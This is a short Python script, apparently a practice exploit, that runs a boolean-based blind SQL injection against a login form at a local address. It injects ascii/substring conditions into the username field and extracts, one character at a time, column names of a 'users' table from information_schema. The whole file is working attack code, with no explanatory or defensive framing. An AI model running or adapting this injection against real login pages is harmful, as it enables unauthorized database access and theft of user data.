import requests
import time

start = time.time()
url = "http://127.0.0.1:9090/login"
payload = "select column_name from information_schema.columns where table_name='users' limit 5,1"
for posi in range(0,25):
    for char in range(47,130):
        body = "x' or ascii(substring(("+payload+"),"+str(posi)+",1))='"+str(char)+"'#"
        data = {"username":body}
        resp = requests.post(url, data=data)
        
        if "Welcom" in resp.text:
            print(chr(char))
        
end = time.time()
print(f"python takes: {end - start:.2f}")
